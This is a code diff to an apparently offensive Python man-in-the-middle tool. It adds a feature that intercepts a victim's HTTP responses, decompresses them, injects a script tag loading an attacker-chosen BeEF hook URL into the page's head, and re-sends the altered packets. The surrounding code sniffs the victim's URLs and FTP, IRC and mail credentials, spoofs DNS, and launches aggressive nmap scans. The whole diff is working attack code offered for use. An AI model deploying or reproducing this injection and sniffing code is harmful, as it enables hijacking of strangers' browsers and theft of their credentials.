@@ -34,12 +34,16 @@ from twisted.internet import reactor
 from twisted.internet.interfaces import IReadDescriptor
 from twisted.internet.protocol import Protocol, Factory
 import nfqueue
+from zlib import decompressobj, decompress
+import gzip
+from cStringIO import StringIO
 
 #Create the arguments
 parser = argparse.ArgumentParser()
 parser.add_argument("-u", "--urlspy", help="Show all URLs the victim is browsing minus URLs that end in .jpg, .png, .gif, .css, and .js to make the output much friendlier. Also truncates URLs at 150 characters. Use -v to print all URLs and without truncation.", action="store_true")
-parser.add_argument("-ip", "--ipaddress", help="Enter IP address of victim and skip the arp ping at the beginning which would give you a list of possible targets.")
+parser.add_argument("-ip", "--ipaddress", help="Enter IP address of victim and skip the arp ping at the beginning which would give you a list of possible targets. Usage: -ip <victim IP>")
 parser.add_argument("-d", "--driftnet", help="Open an xterm window with driftnet.", action="store_true")
+parser.add_argument("-b", "--beef", help="Inject a BeEF hook URL. Usage: -b <url to BeEF hook>")
 parser.add_argument("-v", "--verboseURL", help="Shows all URLs the victim visits but doesn't limit the URL to 150 characters like -u does.", action="store_true")
 parser.add_argument("-dns", "--dnsspoof", help="Spoof DNS responses of a specific domain. Enter domain after this argument. An argument like [facebook.com] will match all subdomains of facebook.com")
 parser.add_argument("-set", "--setoolkit", help="Start Social Engineer's Toolkit in another window.", action="store_true")
@@ -85,13 +89,22 @@ class Parser():
 	POPdest = ''
 	Cookies = []
 	IRCnick = ''
+
 	oldHTTPack = ''
 	oldHTTPload = ''
 	HTTPfragged = 0
+
 	mail_passwds = []
 	oldmailack = ''
 	oldmailload = ''
 	mailfragged = 0
+
+	oldBEEFack = ''
+	catch_pkts = 0
+	full_pkt = ''
+	full_load = ''
+	drop_load = []
+	start_time = 0
 
 	def start(self, payload):
 		try:
@@ -103,14 +116,21 @@ class Parser():
 		IP_layer = pkt[IP]
 		IP_dst = pkt[IP].dst
 		IP_src = pkt[IP].src
-		if args.urlspy or args.post:
+		if args.urlspy or args.post or args.beef:
 			if pkt.haslayer(Raw):
 				if pkt.haslayer(TCP):
 					dport = pkt[TCP].dport
 					sport = pkt[TCP].sport
 					ack = pkt[TCP].ack
-					# Can't use repr if we're gzip deflating which will be necessary when code injection is added
-					load = repr(pkt[Raw].load)[1:-1]
+					load = pkt[Raw].load
+#################################################
+					if sport == 80:
+#						for x in self.drop_load:
+#							if load == x:
+#								payload.set_verdict(nfqueue.NF_DROP)
+#								return
+						self.beef(load, ack, pkt, payload)
+#################################################
 					mail_ports = [25, 26, 110, 143]
 					if dport in mail_ports or sport in mail_ports:
 						self.mailspy(load, dport, sport, IP_dst, IP_src, mail_ports, ack)
@@ -129,6 +149,116 @@ class Parser():
 					dns_layer = pkt[DNS]
 					self.dnsspoof(dns_layer, IP_src, IP_dst, sport, dport, localIP, payload)
 
+#################################################
+	def beef(self, load, ack, pkt, payload):
+		current_time = time.time()
+############### Maybe test the next packet for having headers. If it does, then block it and inject?
+		if self.catch_pkts == 1 and current_time > self.start_time + 1:
+			for x in self.drop_load:
+				if load == x:
+					print '[-] load found in drop_load list'
+					payload.set_verdict(nfqueue.NF_DROP)
+					break
+			self.inject()
+		if self.catch_pkts == 1 and self.oldBEEFack == ack and self.oldBEEFack != 0:
+			self.full_data = self.full_data+load
+			print '[+] Added data to the BeEF queue'
+			payload.set_verdict(nfqueue.NF_DROP)
+			return
+		if 'Content-Type: text/html' in load and self.catch_pkts == 0:
+			self.start_time = time.time()
+			print '[+] HTML packet found, starting BeEF queue'
+			self.drop_load.append(load)
+			self.oldBEEFack = ack
+			self.full_pkt = pkt
+			self.full_data = load
+			self.server = pkt[IP].src
+			self.catch_pkts = 1
+			payload.set_verdict(nfqueue.NF_DROP)
+			return
+
+	def inject(self):
+		url = '<script src='+args.beef+'></script> '
+		if self.full_pkt != '' and self.full_data != '':
+
+			try:
+				headers, body = self.full_data.split("\r\n\r\n", 1)
+			except:
+				headers = self.full_data
+				body = ''
+
+			# Decompress the body
+			if 'Content-Encoding: gzip' in headers:
+				if body != '':
+					try:
+						decomp=decompressobj(16+zlib.MAX_WBITS)
+						body = decomp.decompress(body)
+					except:
+						print '[-] Could not decompress body of packet'
+						self.full_data = ''
+						self.full_pkt = ''
+						self.catch_pkts = 0
+						self.oldBEEFack = 0
+						return
+
+			if '<html' in body:
+				psplit = str(body).split('<head>')
+				try:
+					body = psplit[0]+'<head> '+url+psplit[1]
+				except:
+					print '[-] <head> not found in load'
+					try:
+						psplit = str(body).split('</head>')
+						body = psplit[0]+url+'</head>'+psplit[1]
+					except:
+						print '[-] </head> not found in load'
+						self.full_data = ''
+						self.full_pkt = ''
+						self.catch_pkts = 0
+						self.oldBEEFack = 0
+						return
+
+			# Recompress data if necessary
+			if 'Content-Encoding: gzip' in headers:
+				try:
+					comp_body = StringIO()
+					f = gzip.GzipFile(fileobj=comp_body, mode='wb', compresslevel = 6)
+					f.write(body)
+					f.close()
+					body = comp_body.getvalue()
+				except:
+					self.full_data = ''
+					self.full_pkt = ''
+					self.catch_pkts = 0
+					self.oldBEEFack = 0
+					print '[-] Could not recompress html'
+
+			try:
+				httporiginallength = headers.split('Content-Length: ')[1].split("\r")[0]
+			except:
+				print '[-] Could not split headers at Content-Length\n'
+				self.full_data = ''
+				self.full_pkt = ''
+				self.catch_pkts = 0
+				self.oldBEEFack = 0
+				return
+			httpnewlength = str(len(headers+"\r\n\r\n"+body))
+			headers = headers.replace("Content-Length: " + httporiginallength, "Content-Length: " + httpnewlength)
+
+			self.full_pkt[Raw].load = headers+"\r\n\r\n"+body
+			self.full_pkt[IP].len = len(str(self.full_pkt))
+			del self.full_pkt[IP].chksum
+			del self.full_pkt[TCP].chksum
+
+			catch_pkts = 0
+			send(self.full_pkt)
+			print '[!] Sent injected packet'
+			self.full_data = ''
+			self.full_pkt = ''
+			self.catch_pkts = 0
+			self.oldBEEFack = 0
+#################################################
+
 	# Spoof DNS for a specific domain to point to your machine
 	def dnsspoof(self, dns_layer, IP_src, IP_dst, sport, dport, localIP, payload):
 		if args.dnsspoof:
@@ -143,6 +273,7 @@ class Parser():
 
 	def URL(self, load, ack, dport, sport):
 
+		load = repr(load)[1:-1]
 		host = None
 		get = None
 		post = None
@@ -224,7 +355,7 @@ class Parser():
 					logger.write('[+] Searched '+host+ ' for: '+searched+'\n')
 
 			#Print POST load
-			if post:
+			if args.post and post:
 				if 'ocsp' in url:
 					print B+'[+] POST: '+W+url
 					logger.write('[+] POST: '+url+'\n')
@@ -251,7 +382,7 @@ class Parser():
 	url = None
 
 	def ftp(self, load, IP_dst, IP_src):
-		load = load.replace(r"\r\n", "")
+		load = repr(load)[1:-1].replace(r"\r\n", "")
 		if 'USER ' in load:
 			print R+'[!] FTP '+load+' SERVER: '+IP_dst+W
 			logger.write('[!] FTP '+load+' SERVER: '+IP_dst+'\n')
@@ -263,7 +394,7 @@ class Parser():
 			logger.write('[*] FTP '+load+'\n')
 
 	def irc(self, load, dport, sport, IP_src):
-			load = load.split(r"\r\n")
+			load = repr(load)[1:-1].split(r"\r\n")
 			if args.post:
 				if IP_src == victimIP:
 					if 'NICK ' in load[0]:
@@ -335,6 +466,7 @@ class Parser():
 					logger.write('[!] Password: '+p[1]+'\n')
 
 	def mailspy(self, load, dport, sport, IP_dst, IP_src, mail_ports, ack):
+		load = repr(load)[1:-1]
 		# Catch fragmented mail packets
 		if ack == self.oldmailack:
 			if load != r'.\r\n':
@@ -666,7 +798,7 @@ def threads():
 				print '[-] Could not open SEToolkit, is it installed? Continuing as normal without it.'
 
 	if args.nmapaggressive:
-		print '[*] Starting '+R+'aggressive scan [nmap -T4 -A -v -Pn -oN '+victimIP+W+'] in background; results will be in a file '+victimIP+'.nmap.txt'
+		print '[*] Starting '+R+'aggressive scan [nmap -T4 -A -v -Pn -oN '+victimIP+']'+W+' in background; results will be in a file '+victimIP+'.nmap.txt'
 		try:
 			n = Thread(target=os.system, args=('nmap -T4 -A -v -Pn -oN '+victimIP+'.nmap.txt '+victimIP+' >/dev/null 2>&1',))
 			n.daemon = True
